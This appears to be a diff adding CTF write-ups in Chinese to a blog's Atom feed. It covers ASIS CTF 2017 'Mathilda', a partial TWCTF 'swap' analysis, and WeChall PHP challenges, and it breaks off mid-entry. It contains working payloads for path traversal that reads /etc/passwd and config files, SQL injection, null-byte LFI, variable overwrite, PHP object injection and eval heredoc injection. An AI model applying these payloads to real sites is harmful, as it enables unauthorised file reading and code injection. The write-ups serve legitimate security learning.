@@ -173,7 +173,194 @@
       <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
       <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ASISCTF2017-Mathilda-writeup</title>
+    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/"/>
+    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/</id>
+    <published>2017-09-11T07:02:47.000Z</published>
+    <updated>2017-09-11T08:25:35.178Z</updated>
+    
+    <content type="html"><![CDATA[<p>ASISCTF2017-Mathilda-writeup<br>文件包含 apache配置userdir<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Description:</div><div class="line">Mathilda learned many skills from Leon, now she want to use them!</div><div class="line">http://178.62.48.181/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/1.png?raw=true" alt=""></p>
+<p>打开后是如上，查看源代码，发现：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/2.png?raw=true" alt=""></p>
+<p>访问：<a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 。底下有个file选项，链接为: <a href="http://178.62.48.181/~rooney/?path=rooney" target="_blank" rel="external">http://178.62.48.181/~rooney/?path=rooney</a></p>
+<p>猜测path参数存在文件包含漏洞。经过尝试，可以发现后端会把path参数里的<code>../</code>替换为空。如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/3.png?raw=true" alt=""></p>
+<p>尝试读取index.php，如果直接访问 <a href="http://178.62.48.181/~rooney/index.php?path=index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=index.php</a> ，会发现直接返回<code>Security failed!</code>，鉴于会过滤<code>../</code>，可以用<code>p../hp</code>来绕过。经过一番尝试，最后访问：<a href="http://178.62.48.181/~rooney/index.php?path=..././index.ph../p" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=..././index.ph../p</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/7.png?raw=true" alt=""><br>不过似乎没啥信息。</p>
+<p>接着尝试读取 <code>/etc/passwd</code>，比如路径为 <code>../../../../etc/passwd</code>，则根据过滤，传入的参数应为：<code>..././..././..././..././etc/passwd</code>。<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
+<p>或者访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/index.php?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/4.png?raw=true" alt=""></p>
+<p>最底下有一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash</div></pre></td></tr></table></figure></p>
+<p>说明存在一个用户：th1sizveryl0ngus3rn4me</p>
+<p>接下来需要知道一些apache的知识。apache中有一个功能 <a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>。在多用户的操作系统上，如果apache配置了UserDir，则每个用户可以在自己的目录下建立一个web服务器，对应的url即为:<a href="http://example.com/~username/" target="_blank" rel="external">http://example.com/~username/</a> ，就本例而言 <a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 即表示rooney用户自己的目录的web服务器。</p>
+<p>所以尝试访问: <a href="http://178.62.48.181/~th1sizveryl0ngus3rn4me" target="_blank" rel="external">http://178.62.48.181/~th1sizveryl0ngus3rn4me</a> ，结果直接返回个 Invalid Device 。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/5.png?raw=true" alt=""></p>
+<p>继续看看关于apache:UserDir的知识。UserDir指令可以指定被网络读取的用户网站目录，有如下几种不同的形式。</p>
+<ol>
+<li>路径前没有反斜杠，则被当作用户目录下的文件夹，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /home/rooney/public_html/index.php</p>
+<ol>
+<li>路径前有反斜杠，则利用路径和文件名构造。比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/html</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/html/rooney/index.php</p>
+<ol>
+<li>如果路径中存在星号<code>*</code>，则用用户名去替代，比如配置为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/www/*/docs</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/www/rooney/docs/index.php</p>
+<ol>
+<li>设置多重路径，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html /var/html</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会先去查找 /home/rooney/public_html/index.php ，如果找不到，那就去查找 /var/html/rooney/index.php</p>
+<p>以上的这些配置指令取自<a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>的例子。这些指令需要在userdir.conf中进行配置。我们尝试读取一下服务器端的userdir.conf，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././etc/apache2/mods-enabled/userdir.conf</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/8.png?raw=true" alt=""></p>
+<p>所以可以知道，如果我们访问：<br><code>http://178.62.48.181/~th1sizveryl0ngus3rn4me/index.php</code> 实际上会被apache服务器解释为 /home/th1sizveryl0ngus3rn4me/public_html/index.php 。由于直接访问不允许，我们可以利用 rooney 的文件包含来读取，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.ph../p</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/9.png?raw=true" alt=""></p>
+<p>所以看起来，我们用了非预期的解法hhh。可以看出同目录下就有flag.php，我们可以直接读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.ph../p</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/10.png?raw=true" alt=""></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ASIS&#123;I_l0V3_Us3rD1r_Mpdul3!!&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;ASISCTF2017-Mathilda-writeup&lt;br&gt;文件包含 apache配置userdir&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>TWCTF 2017-swap-writeup</title>
+    <link href="http://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/"/>
+    <id>http://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/</id>
+    <published>2017-09-09T06:51:02.000Z</published>
+    <updated>2017-09-11T08:26:23.370Z</updated>
+    
+    <content type="html"><![CDATA[<p>TWCTF 2017-swap-writeup<br>PLT GOT<br><a id="more"></a></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/pwn/ctf/twctf$ ./swap</div><div class="line">==============================================</div><div class="line">1. Set addrsses</div><div class="line">2. Swap both addrress of value</div><div class="line">0. Exit</div><div class="line">Your choice:</div></pre></td></tr></table></figure>
+<p>程序有三个功能。选1是设置两个地址，选2是交换两个地址上的值，选0是退出。用IDA反汇编后。</p>
+<p>main函数    ：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rax@6</span></div><div class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax@6</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+20h] [bp-20h]@0</span></div><div class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [sp+28h] [bp-18h]@0</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+30h] [bp-10h]@7</span></div><div class="line">  __int64 v9; <span class="comment">// [sp+38h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v9 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  initialize(*(_QWORD *)&amp;argc, argv, envp);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      print_menu(*(_QWORD *)&amp;argc);</div><div class="line">      v3 = read_int(*(_QWORD *)&amp;argc);</div><div class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      LODWORD(v4) = read_ll(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      src = v4;</div><div class="line">      *(_QWORD *)&amp;argc = <span class="string">"Please input 2nd addr"</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      LODWORD(v5) = read_ll(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      v7 = v5;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memcpy</span>(&amp;dest, src, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(src, v7, <span class="number">8u</span>LL);</div><div class="line">      *(_QWORD *)&amp;argc = v7;</div><div class="line">      <span class="built_in">memcpy</span>(v7, &amp;dest, <span class="number">8u</span>LL);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !v3 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Bye."</span>);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其中有个read_ll()，反汇编后代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">read_ll</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  __int64 v1; <span class="comment">// rcx@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-110h]@1</span></div><div class="line">  __int64 v3; <span class="comment">// [sp+118h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</div><div class="line">  result = atoll(&amp;buf);</div><div class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>晚上写完后再贴上来hh</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;TWCTF 2017-swap-writeup&lt;br&gt;PLT GOT&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:bin" scheme="http://chybeta.github.io/categories/writeup-bin/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WeChall-PHP-writeup</title>
+    <link href="http://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/"/>
+    <id>http://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/</id>
+    <published>2017-09-07T16:28:43.000Z</published>
+    <updated>2017-09-08T16:17:27.736Z</updated>
+    
+    <content type="html"><![CDATA[<p>WeChall PHP关。<br><a id="more"></a></p>
+<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p>题目源码：<a href="https://www.wechall.net/challenge/no_escape/index.php?highlight=christmas" target="_blank" rel="external">https://www.wechall.net/challenge/no_escape/index.php?highlight=christmas</a></p>
+<p>流程大概如下：</p>
+<ol>
+<li>点击vote按钮后，调用noesc_voteup()</li>
+<li>noesc_voteup()中，执行update操作后，调用noesc_stop100()</li>
+<li>noesc_stop100()，先检查票数是否为111，若是则通过。接着检查票数是否大于等于100，若是则清零。</li>
+</ol>
+<p>也就是说，通过vote的方法是达不到票数为111的。看一下noesc_voteup()的第60行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$who = mysql_real_escape_string($who);</div><div class="line">$query = <span class="string">"UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1"</span>;</div></pre></td></tr></table></figure></p>
+<p>mysql_real_escape_string()会对如下字符进行转义，即在前面加上反斜杠：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a<br>该函数在php5.5.0后废弃，php7.0.0开始移除。</li>
+</ul>
+<p>在本题中，update的操作是用反引号来包含，所以如果我们传入参数为 <code>bill`=111 -- +</code><br>显示的sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE noescvotes SET `bill`=111 -- `=`bill`=111 -- `+1 WHERE id=1</div></pre></td></tr></table></figure></p>
+<p>将bill票数设置为111，并且通过<code>--</code>使得后面注释掉。从而成功注入。</p>
+<p>访问：<a href="https://www.wechall.net/challenge/no_escape/index.php" target="_blank" rel="external">https://www.wechall.net/challenge/no_escape/index.php</a><br>?vote_for=bill`=111 — +</p>
+<p>通关。</p>
+<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p>漏洞代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$code = <span class="string">'$filename = \'pages/\'.(isset($_GET["file"])?$_GET["file"]:"welcome").\'.html\';'</span>;</div><div class="line">$code_emulate_pnb = <span class="string">'$filename = Common::substrUntil($filename, "\\0");'</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></div><div class="line">$code2 = <span class="string">'include $filename;'</span></div><div class="line"></div><div class="line">...</div><div class="line"><span class="keyword">eval</span>($code.$code_emulate_pnb); <span class="comment"># eval the first line</span></div><div class="line">...</div><div class="line"><span class="keyword">if</span> (lfiIsSafeDir($filename) === <span class="keyword">true</span>) &#123; <span class="keyword">eval</span>($code2); &#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>可以看到它自己模拟了一个<code>\0</code>的字符串截止符。为了能包含solution.php，可以利用00截断来bypass掉源代码中会附加的<code>.html</code>。</p>
+<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00</div></pre></td></tr></table></figure></p>
+<h1 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP 0817"></a>PHP 0817</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</div><div class="line">&#123;</div><div class="line">        $which = $_GET[<span class="string">'which'</span>];</div><div class="line">        <span class="keyword">switch</span> ($which)        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;                <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>目标是包含solution.php。这里考察php弱类型比较。我们传入的which为字符串，在进行swich比较时字符串会被转化成0，然后再与数字0,1,2进行比较。所以payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/php0817/index.php?which=solution</div></pre></td></tr></table></figure></p>
+<h1 id="Training-Register-Globals"><a href="#Training-Register-Globals" class="headerlink" title="Training: Register Globals"></a>Training: Register Globals</h1><p>这里可以看到源代码： <a href="https://www.wechall.net/challenge/training/php/globals/index.php?highlight=christmas" target="_blank" rel="external">https://www.wechall.net/challenge/training/php/globals/index.php?highlight=christmas</a></p>
+<p>其中这段代码存在变量覆盖漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">foreach ($_GET as $k =&gt; $v) &#123;</div><div class="line">$$k = $v;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>要使<code>strtolower($login[0]) === &#39;admin&#39;</code>，可以通过GET传入<code>login[0]=admin</code>。通过上面的代码将会执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$login[0]=admin;</div></pre></td></tr></table></figure></p>
+<p>从而满足条件。</p>
+<p>username和password可以随便填写。</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin</div></pre></td></tr></table></figure></p>
+<h1 id="Are-you-serial"><a href="#Are-you-serial" class="headerlink" title="Are you serial"></a>Are you serial</h1><p>这题考察php反序列化。</p>
+<p>在 <a href="https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=code.php" target="_blank" rel="external">https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=code.php</a> 中第四十行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (false !== ($user = unserialize(Common::getCookie(&apos;serial_user&apos;, &apos;&apos;))))</div></pre></td></tr></table></figure></p>
+<p>从cookie中取出对应的字段，并进行反序列化。</p>
+<p>而在 <a href="https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=SERIAL_Solution.php" target="_blank" rel="external">https://www.wechall.net/challenge/are_you_serial/index.php?ShowSource=SERIAL_Solution.php</a> 中有一个SERIAL_Solution的类，里面的_wakeup 方法可以直接通过此关。</p>
+<p>所以做法就是生成一个序列串，通过cookie传入，然后反序列化后生成SERIAL_Solution类，并自动调用_wakeup方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SERIAL_Solution</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line">        &#123;                <span class="keyword">if</span> (<span class="keyword">false</span> === ($chall = WC_Challenge::getByTitle(GWF_PAGE_TITLE)))</div><div class="line">                &#123;</div><div class="line">                        $chall = WC_Challenge::dummyChallenge(GWF_PAGE_TITLE, <span class="number">2</span>, <span class="string">'challenge/are_you_serial/index.php'</span>);</div><div class="line">                &#125;</div><div class="line">                $chall-&gt;onChallengeSolved(GWF_Session::getUserID());        </div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$tmp = <span class="keyword">new</span> SERIAL_Solution();</div><div class="line"><span class="keyword">echo</span> serialize($tmp);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>得到： O:15:”SERIAL_Solution”:0:{} 。修改cookie：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170908/1.png?raw=true" alt=""></p>
+<h1 id="PHP-0819"><a href="#PHP-0819" class="headerlink" title="PHP 0819"></a>PHP 0819</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// closure, because of namespace!</span></div><div class="line">$challenge = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        $f = Common::getGetString(<span class="string">'eval'</span>);        $f = str_replace(<span class="keyword">array</span>(<span class="string">'`'</span>, <span class="string">'$'</span>, <span class="string">'*'</span>, <span class="string">'#'</span>, <span class="string">':'</span>, <span class="string">'\\'</span>, <span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'.'</span>, <span class="string">'&gt;'</span>), <span class="string">''</span>, $f);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((strlen($f) &gt; <span class="number">13</span>) || (<span class="keyword">false</span> !== stripos($f, <span class="string">'return'</span>)))</div><div class="line">        &#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'sorry, not allowed!'</span>);        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">                <span class="keyword">eval</span>(<span class="string">"\$spaceone = $f"</span>);        &#125;</div><div class="line">        <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</div><div class="line">        &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ($spaceone === <span class="string">'1337'</span>);</div><div class="line">&#125;;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>分析一下流程，通过get的eval参数传入并赋值到变量<code>$f</code>，然后经过str_replace()的过滤，要求长度小于13，并且不包含字符串return，接着执行eval。</p>
+<p>目标是让结果返回True。最后一行<code>$spaceone === &#39;1337&#39;</code>，不存在弱类型比较，要求类型和值都得相等。看一下str_replace()，过滤了单引号，双引号，所以如果直接get传参<code>index.php?eval=&#39;1337&#39;</code>进去，在经过过滤后，到最后会变为<code>$spaceone=1337</code>，是一个数值类型而非字符串。</p>
+<p>查一下php手册；<a href="http://php.net/manual/zh/language.types.string.php" target="_blank" rel="external">http://php.net/manual/zh/language.types.string.php</a> 。除了用单引号，双引号表示字符串外，还有以下两种：</p>
+<ul>
+<li>heredoc 语法结构</li>
+<li>nowdoc 语法结构</li>
+</ul>
+<p>用一个简单的例子，对heredoc语法结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$f = &lt;&lt;&lt;q</div><div class="line">1337</div><div class="line">q;</div></pre></td></tr></table></figure></p>
+<p><code>&lt;&lt;&lt;</code>后面要提供一个标识符，这里为<code>q</code>，然后换行。接下来是字符串本身，这里为<code>1337</code>。结束时所引用的标识符必须在该行的第一列，即标识符<code>q</code>要在开头。标识符的命名只能包含字母、数字和下划线，并且必须以字母和下划线作为开头。在结束标识符这行除了可能有一个分号（;）外，绝对不能包含其它字符，更重要的是结束标识符的前面必须是个被本地操作系统认可的换行，比如在 UNIX 和 Mac OS X 系统中是 \n，而结束定界符（可能其后有个分号）之后也必须紧跟一个换行。</p>
+<p>所以在本题中，我们构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.wechall.net/challenge/space/php0819/index.php?eval=&lt;&lt;&lt;q%0a1337%0aq;%0a</div></pre></td></tr></table></figure></p>
+<p>注意 %0a 即换行。</p>
+<p>而nowdoc语法结构中，由于<code>&lt;&lt;&lt;</code>后的标识符要用单引号括起来，所以这里无法利用，不展开。</p>
+<h1 id="Host-ME"><a href="#Host-ME" class="headerlink" title="Host ME"></a>Host ME</h1><p>……未果。</p>
+<h1 id="PHP-0818"><a href="#PHP-0818" class="headerlink" title="PHP 0818"></a>PHP 0818</h1><p>题目要求我们传入的每一位不允许是1到9的数字。而。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">3735929054</span>)</div><div class="line"><span class="string">'0xdeadc0de'</span></div></pre></td></tr></table></figure></p>
